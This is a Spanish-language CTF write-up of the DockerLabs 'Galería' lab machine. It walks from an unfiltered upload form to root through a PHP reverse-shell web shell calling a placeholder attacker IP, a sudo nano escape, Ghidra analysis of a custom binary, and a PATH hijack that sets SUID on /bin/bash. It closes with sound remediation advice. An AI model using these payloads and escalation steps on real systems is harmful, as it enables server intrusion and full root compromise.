# Galería (DockerLabs) — Writeup

Dificultad: fácil

A simple vista esta máquina es una web de fotos sin pretensiones, del tipo que cualquiera monta en una tarde para presumir de un álbum. Pero detrás de esa fachada hay un formulario de subida que no filtra absolutamente nada, una cadena de dos escalones de sudo, y un cierre que obliga a sacar la artillería pesada: ingeniería inversa con Ghidra para entender qué hace un binario antes de decidir cómo abusar de él.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El reto se divide en tres bloques de dificultad creciente. El primero es casi trivial: un formulario de subida de imágenes que acepta PHP sin ningún tipo de comprobación. El segundo es un salto de usuario ya visto en otras máquinas de esta colección, usando `nano` como vía de escape desde sudo. El tercero es el más interesante: en vez de limitarse a leer el código de un script o consultar GTFOBins, hay que decompilar un binario compilado para entender su comportamiento interno antes de poder explotarlo mediante un path hijacking.

---

## Paso 0: desplegar el laboratorio

```bash
unzip galeria.zip
bash auto_deploy.sh galeria.tar
```

Con la IP confirmada, reconocimiento estándar.

---

## Paso 1: escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p80 172.17.0.2
```

```
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
|_http-title: Gallery
```

Un único puerto abierto. La página muestra, en efecto, una galería de imágenes con aspecto perfectamente normal — nada que grite vulnerabilidad a simple vista.

---

## Paso 2: fuzzing hasta encontrar el formulario de subida

```bash
gobuster dir -u http://172.17.0.2/ -w directory-list-2.3-medium.txt -t 50 -k -r
```

```
/gallery   (Status: 200)
```

Navegando dentro de `/gallery` aparece un subdirectorio `/uploads`, y dentro de él, un script PHP que gestiona subida de archivos. El patrón ya es familiar en este tipo de retos: donde hay un formulario de subida sin más protección visible, el primer instinto es probar directamente con una web shell.

---

## Paso 3: subir la web shell, sin ningún obstáculo por el camino

```
http://172.17.0.2/gallery/uploads/handler.php
```

Se prepara un archivo PHP mínimo, suficiente para abrir una conexión de red directamente hacia un shell del sistema:

```php
<?php
$sock = fsockopen("<IP-atacante>", <PUERTO>);
$proc = proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

Al subirlo, el servidor responde con un mensaje de confirmación de subida exitosa, sin exigir ningún tipo de bypass de extensión ni validación adicional — el formulario simplemente no comprueba nada. El archivo queda accesible en `/gallery/uploads/images/webshell.php`, tal como había revelado la enumeración con Gobuster.

---

## Paso 4: disparar la conexión

Listener a la espera:

```bash
nc -lvnp 7777
```

Y visitando la ruta del archivo subido:

```
http://172.17.0.2/gallery/uploads/images/webshell.php
```

```
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 51294
whoami
www-data
```

Acceso conseguido como el usuario habitual de Apache. Toca el tratamiento de TTY de rigor antes de continuar:

```bash
script /dev/null -c bash
```
```
Ctrl + Z
```
```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows <FILAS> columns <COLUMNAS>
```

---

## Paso 5: primer salto de usuario — nano, otra vez

```bash
sudo -l
```

```
User www-data may run the following commands:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano
```

Dos entradas, ambas sobre nano, pero la interesante es la que permite ejecutar como **gallery**. El mecanismo de escape es el ya conocido: dentro del editor, la combinación **Ctrl+R** seguido de **Ctrl+X** abre un prompt para ejecutar un comando externo en lugar de leer un archivo.

```bash
sudo -u gallery nano
```

```
^R^X
reset; bash 1>&0 2>&0
```

```
whoami
gallery
```

Primer salto completado.

---

## Paso 6: un binario que hay que abrir con lupa

```bash
sudo -l
```

```
User gallery may run the following commands:
    (ALL) NOPASSWD: /usr/local/bin/runme
```

A diferencia de máquinas anteriores donde el binario permitido era una herramienta conocida y catalogada en GTFOBins, aquí `runme` es un ejecutable compilado a medida para este reto. No hay ficha de GTFOBins que consultar — toca analizarlo por cuenta propia.

Se transfiere el binario a la máquina atacante para estudiarlo con calma:

```bash
# En la víctima
cd /usr/local/bin/
python3 -m http.server
```

```bash
# En la máquina atacante
wget http://<IP-victima>:8000/runme
```

Con el binario en local, se abre con **Ghidra**, la suite de ingeniería inversa de código abierto, para decompilarlo y entender su lógica interna sin necesidad de ejecutarlo a ciegas. Tras crear un proyecto, importar el binario y navegar hasta `Functions → main`, el código decompilado revela que el programa invoca a otro binario externo durante su ejecución — probablemente relacionado con conversión de imágenes, dado el contexto de la galería.

---

## Paso 7: el comando que no existe, y la oportunidad que eso representa

Se prueba directamente en la terminal el nombre del comando identificado en la decompilación:

```bash
convert
```

```
bash: convert: command not found
```

El comando no está instalado en el sistema. Y aquí está la clave: si `runme` invoca `convert` sin especificar su ruta absoluta, confiando en que el sistema lo resuelva a través del `$PATH`, entonces cualquier ejecutable con ese mismo nombre, colocado en un directorio que se consulte antes que las rutas estándar, será el que realmente se ejecute quien invoque el binario.

---

## Paso 8: fabricando el `convert` propio

```bash
cd /tmp
nano convert
```

```bash
#!/bin/bash
echo "Permisos establecidos de forma correcta..."
chmod u+s /bin/bash
```

A diferencia de otros casos de path hijacking donde el script malicioso simplemente abre una shell directamente, aquí el enfoque es distinto y más elegante: en vez de spawnear una shell efímera, el script **establece el bit SUID sobre `/bin/bash`**. Esto convierte el propio bash del sistema en un binario con privilegios elevados de forma persistente, disponible para cualquier ejecución posterior con la opción `-p`.

```bash
chmod +x convert
export PATH=/tmp:$PATH
```

Con el directorio `/tmp` antepuesto al `$PATH`, el sistema encontrará nuestro `convert` antes que cualquier otra ubicación (aunque, en este caso, tampoco había ninguna otra, dado que el comando original ni siquiera estaba instalado).

---

## Paso 9: disparar el binario y confirmar el resultado

```bash
sudo /usr/local/bin/runme
```

```
Converting image...
Permisos establecidos de forma correcta...
Done.
```

El binario, ejecutado con privilegios de root vía sudo, invoca internamente `convert`, resuelve el nombre hacia el script recién creado en `/tmp`, y lo ejecuta heredando esos privilegios. El script, a su vez, marca `/bin/bash` con el bit SUID.

```bash
ls -la /bin/bash
```

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Confirmado: bash ahora tiene el bit `s` activo. Con eso, basta con invocarlo preservando privilegios:

```bash
bash -p
```

```
whoami
root
```

Root conseguido, a través de una cadena que combinó web shell, escape de nano, ingeniería inversa con Ghidra, y path hijacking clásico.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Vector inicial | Subida de web shell PHP sin ninguna validación |
| Acceso obtenido | www-data |
| Salto 1 | www-data → gallery, vía `sudo nano` (Ctrl+R Ctrl+X) |
| Análisis de binario | Decompilación de `runme` con Ghidra |
| Vulnerabilidad final | Path hijacking sobre el comando `convert`, inexistente en el sistema |
| Técnica de persistencia | Establecer bit SUID sobre `/bin/bash` en vez de shell directa |
| Resultado final | root, vía `bash -p` |

---

## Qué falló aquí (y cómo se evita)

1. **Formulario de subida de imágenes sin ninguna validación de tipo o contenido.** El mismo fallo de siempre: aceptar cualquier archivo tal cual, permitiendo subir y ejecutar código PHP arbitrario en el servidor.
2. **Regla de sudo NOPASSWD sobre nano.** Cualquier editor de texto capaz de invocar comandos externos, concedido sin restricciones vía sudo, equivale a una vía de escalada directa.
3. **Binario personalizado que invoca comandos externos sin ruta absoluta.** El fallo central de la máquina: `runme` confía en el `$PATH` del sistema para resolver `convert`, en vez de especificar su ubicación exacta (`/usr/bin/convert` o similar). Esta es una de las causas más comunes de path hijacking en scripts y binarios personalizados, y la solución es siempre la misma: nunca invocar comandos externos sin ruta absoluta desde un contexto con privilegios elevados.
4. **Dependencia de un binario que ni siquiera está instalado en el sistema.** Más allá del vector de ataque, desplegar en producción un programa que depende de un comando ausente es, en sí mismo, un síntoma de despliegue apresurado sin las comprobaciones adecuadas.

---

## Referencias

- Ghidra: https://ghidra-sre.org/
- GTFOBins — nano: https://gtfobins.github.io/gtfobins/nano/
- DockerLabs: https://dockerlabs.es/
